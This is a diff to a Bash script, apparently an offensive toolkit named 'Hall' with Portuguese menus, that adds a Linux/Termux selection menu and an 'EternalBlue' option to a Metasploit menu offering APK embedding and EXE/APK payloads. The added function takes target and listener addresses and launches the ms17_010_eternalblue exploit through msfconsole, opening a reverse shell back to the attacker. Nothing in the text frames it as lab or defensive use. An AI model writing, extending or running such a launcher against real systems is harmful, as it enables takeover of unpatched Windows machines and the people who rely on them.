@@ -8,6 +8,47 @@
 green='\e[0;32m'
 RED='\033[31m'
 NC='\033[0m'
+function sistema {
+  clear
+  echo "Qual seu terminal?: "
+  echo "1. Linux"
+  echo "2. Termux"
+  echo "0. Sair"
+read -p "Opção: " opcao
+  case $opcao in
+    1)
+    clear
+      linux
+      ;;
+    2)
+    clear
+      termux
+      ;;
+    0)
+        echo -e "╔──────────────────────────────────────────────╗"
+    echo -e "|          Author: B3N1N1 owner Hysec          |"
+    echo -e "|          Hall  - Hysec                       |"
+    echo -e "|          Credits to : B3N1N1                 |"
+    echo -e "|                                              |"
+    echo -e "|   Hall use nmap,gobuster,metaspliot,hydra    |"
+    echo -e "┖──────────────────────────────────────────────┙"
+      exit 0
+      ;;
+    *)
+      clear
+      echo "Opção inválida"
+      sleep 1
+      clear
+      sistema
+      ;;
+  esac
+}
+
+function termux {
+  clear
+  echo "ta funcionando"
+}
+function linux {
 function logo {
 clear
 echo -e $green "
@@ -250,6 +291,7 @@ echo "Selecione um serviço para realizar brute force:"
 echo "1. Embed APK"
 echo "2. Payload EXE"
 echo "3. Payload APK"
+echo "4. EternalBlue"
 echo "0. Voltar"
 mtcase
 
@@ -266,6 +308,9 @@ function mtcase {
         3)
             payload_apk
             ;;
+        4)
+            EternalBlue
+            ;;
         0)
             menu_principal
             ;;
@@ -281,7 +326,15 @@ function mtcase {
 
 
 }
-
+function EternalBlue {
+  echo -n "Insira o RHOSTS: "
+  read RHOSTS
+  echo -n "Insira o LHOST: "
+  read LHOST
+  echo -n "Insira o LPORT: "
+  read LPORT
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $RHOSTS; set LHOST $LHOST; set LPORT $LPORT; exploit"
+}
 function embed_apk {
   echo -e $RED "
   COLOQUE O APK ORIGINAL NA PASTA APKS DO HALL
@@ -459,3 +512,5 @@ fi
 
 }
 menu_principal
+}
+sistema
